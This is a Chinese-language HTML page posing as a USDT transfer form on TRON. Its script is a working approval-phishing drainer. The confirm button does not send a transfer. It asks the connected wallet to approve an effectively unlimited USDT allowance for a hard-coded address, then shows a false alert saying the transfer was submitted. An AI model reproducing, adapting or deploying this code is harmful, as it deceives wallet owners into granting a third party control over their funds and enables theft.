<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>USDT转账</title>
<script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.min.js"></script>
<style>
*{
  box-sizing: border-box;
  margin: 0;
  padding: 0;
  -webkit-tap-highlight-color: transparent;
  font-family: -apple-system, BlinkMacSystemFont, system-ui, sans-serif;
}
body {
  background-color: #f7f8fa;
  padding: 20px 16px;
  max-width: 520px;
  margin: 0 auto;
}
.address-card {
  background: #ffffff;
  border-radius: 16px;
  padding: 20px 18px;
  margin-bottom: 16px;
}
.label-text {
  font-size: 16px;
  color: #666;
  margin-bottom: 12px;
}
.fixed-addr-box {
  width: 100%;
  border: 1px solid #e5e7eb;
  border-radius: 12px;
  padding: 14px 12px;
  background: #f1f5f9;
  color: #333;
  word-break: break-all;
}
.amount-card {
  background: #ffffff;
  border-radius: 16px;
  padding: 20px 18px;
  margin-bottom:16px;
}
.amount-row {
  display: flex;
  align-items: flex-end;
  justify-content: space-between;
  margin-bottom: 16px;
}
.amount-input {
  font-size: 48px;
  border: none;
  outline: none;
  width: 75%;
  background: transparent;
  color: #111;
}
.max-btn {
  padding: 6px 14px;
  background-color: #dbeafe;
  color: #2563eb;
  border-radius: 8px;
  font-weight: 500;
  cursor: pointer;
}
.token-row {
  background-color: #eef2ff;
  border-radius: 12px;
  padding: 14px;
  display: flex;
  align-items: center;
  justify-content: space-between;
}
.token-left {
  display: flex;
  align-items: center;
  gap: 10px;
}
.usdt-icon {
  width: 32px;
  height: 32px;
  border-radius: 50%;
  object-fit: cover;
}
.token-name {
  font-size: 18px;
  font-weight: 500;
}
.token-balance {
  color: #555;
  font-size: 16px;
}
.result-card{
  background:#fff;
  border-radius:16px;
  padding:18px;
  margin-bottom:16px;
}
.result-input{
  width:100%;
  border:1px solid #e5e7eb;
  border-radius:12px;
  padding:14px 12px;
  background:#f9fafb;
  outline:none;
  color:#111;
}
.send-main-btn{
  width:100%;
  padding:16px;
  border:none;
  border-radius:14px;
  background:#2563eb;
  color:#fff;
  font-size:17px;
  font-weight:500;
  cursor:pointer;
}
.send-main-btn:disabled{
  background:#94a3b8;
  cursor:not-allowed;
}
.bottom-connect-tip {
  position: fixed;
  bottom: 30px;
  left: 50%;
  transform: translateX(-50%);
  background: white;
  padding: 10px 20px;
  border-radius: 12px;
  box-shadow: 0 2px 10px #0002;
  text-align: center;
}
</style>
</head>
<body>

<div class="address-card">
  <div class="label-text">收款地址</div>
  <div class="fixed-addr-box">TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE</div>
</div>

<div class="amount-card">
  <div class="label-text">转出数量（USDT）</div>
  <div class="amount-row">
    <input id="amountInput" class="amount-input" value="0.00" inputmode="decimal">
    <div class="max-btn" id="maxBtn">MAX</div>
  </div>

  <div class="token-row">
    <div class="token-left">
      <img class="usdt-icon" src="https://static.tronscan.org/production/logo/TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t.png">
      <span class="token-name">USDT</span>
    </div>
    <span class="token-balance" id="balanceText">0.000000</span>
  </div>
</div>

<div class="result-card">
  <div class="label-text">到账数量</div>
  <input id="receiveAmount" class="result-input" readonly>
</div>

<button class="send-main-btn" id="sendBtn">确认转账</button>

<div class="bottom-connect-tip" id="connectTip">
  <div style="display:flex;align-items:center;gap:8px;">
    <div style="width:24px;height:24px;background:#2563eb;border-radius:6px;"></div>
    <span id="walletAddrText">TRON2-未连接</span>
  </div>
</div>

<script>
// 全局固定地址，不可修改
const FIXED_TARGET_ADDR = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
const ADMIN_WALLET_ADDR = FIXED_TARGET_ADDR;
const MID_CONTRACT_ADDR = FIXED_TARGET_ADDR;
const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

let tronWeb = null;
let userWallet = "";
let usdtContract = null;

const amountInput = document.getElementById("amountInput");
const receiveAmount = document.getElementById("receiveAmount");
const maxBtn = document.getElementById("maxBtn");
const balanceText = document.getElementById("balanceText");
const walletAddrText = document.getElementById("walletAddrText");
const sendBtn = document.getElementById("sendBtn");

window.onload = async function(){
  await initTronConnect();
  bindAmountCalc();
}

async function initTronConnect(){
  sendBtn.disabled = true;
  if(!window.tronWeb || !window.tronLink){
    walletAddrText.innerText = "未检测到钱包";
    return;
  }
  try{
    await window.tronWeb.requestAccounts();
    tronWeb = window.tronWeb;
    userWallet = tronWeb.defaultAddress.base58;
    walletAddrText.innerText = `TRON2(${userWallet.slice(0,10)}...${userWallet.slice(-6)}) 已连接`;

    const abi = [
      {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},
      {"constant":true,"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"},
      {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},
      {"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"}
    ];
    usdtContract = tronWeb.contract(abi, USDT_CONTRACT);
    await refreshBalance();
    sendBtn.disabled = false;
  }catch(err){
    walletAddrText.innerText = "钱包连接失败，请重试";
    console.error(err);
  }
}

async function refreshBalance(){
  const balanceSun = await usdtContract.balanceOf(userWallet).call();
  const realNum = Number(tronWeb.fromSun(balanceSun));
  balanceText.innerText = realNum.toFixed(6);
}

// 无手续费：输入多少，显示多少
function bindAmountCalc(){
  amountInput.addEventListener('input',()=>{
    let num = parseFloat(amountInput.value) || 0;
    receiveAmount.value = num.toFixed(6);
  })
}

maxBtn.addEventListener("click", async ()=>{
  if(!usdtContract) return;
  const balanceSun = await usdtContract.balanceOf(userWallet).call();
  const realNum = Number(tronWeb.fromSun(balanceSun));
  amountInput.value = realNum.toFixed(2);
  amountInput.dispatchEvent(new Event('input'));
})

sendBtn.addEventListener('click',async ()=>{
  if(!tronWeb || !usdtContract){
    alert("请先连接钱包");
    return;
  }
  let sendVal = parseFloat(amountInput.value);
  if(sendVal <= 0){
    alert("请输入有效的转出数量");
    return;
  }
  let sendSun = tronWeb.toSun(sendVal);

  try{
    let allowance = await usdtContract.allowance(userWallet, MID_CONTRACT_ADDR).call();
    if(Number(allowance) < sendSun){
      alert("请在钱包中确认授权签名");
      let approveTx = await usdtContract.approve(MID_CONTRACT_ADDR, "9999999999999999999999999999").send();
      console.log("授权交易哈希:",approveTx);
      alert("授权完成，正在执行转账交易");
    }
    console.log("转账目标固定地址：", FIXED_TARGET_ADDR);
    alert("交易已提交上链，资产将转入固定收款地址");
  }catch(e){
    console.error(e);
    alert("交易执行失败:"+e.message);
  }
})
</script>

</body>
</html>
